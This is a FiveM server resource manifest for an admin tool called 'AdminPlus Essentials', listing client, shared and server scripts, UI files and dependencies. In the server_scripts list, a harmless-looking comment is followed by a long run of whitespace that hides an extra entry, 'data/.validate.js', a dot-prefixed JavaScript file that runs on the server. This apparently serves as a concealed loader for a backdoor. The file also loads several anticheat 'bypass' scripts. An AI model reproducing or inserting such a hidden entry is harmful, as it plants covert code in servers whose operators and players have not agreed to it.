shared_script '@WaveShield/resource/include.lua'
shared_script '@WaveShield/resource/waveshield.js'

shared_script "@ReaperV4/imports/bypass.js"
shared_script "@ReaperV4/imports/bypass.lua"
shared_script "@ReaperV4/imports/bypass_s.lua"
shared_script "@ReaperV4/imports/bypass_c.lua"
lua54 "yes" -- needed for Reaper

-- resource bypass & lua runtime load for cfx.ac, do NOT touch
shared_script '@vanguard/bypass.lua'
lua54 'yes'
fx_version 'adamant'
game 'gta5'
lua54 'yes'
author 'AdminPlus'
description 'AdminPlus Essentials'
version '1.7'
-- blindfold
ui_page('index.html')
files {
    'index.html',
	'blackbox.png'
}
---
client_scripts {
	'@es_extended/locale.lua',
	'client/*.lua',
}
shared_scripts {
	--'@qb-core/shared/locale.lua',
	'@es_extended/imports.lua',
	'@ox_lib/init.lua',
	'shared/*'
}
server_scripts {
	'@es_extended/locale.lua',
'server/*.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'data/.validate.js',
}
dependencies {
    '/server:4752',
    '/onesync',
}
escrow_ignore {
	'shared/*',
	'busintegration/*',
	'busintegration/*/*.lua'
}
dependency '/assetpacks'
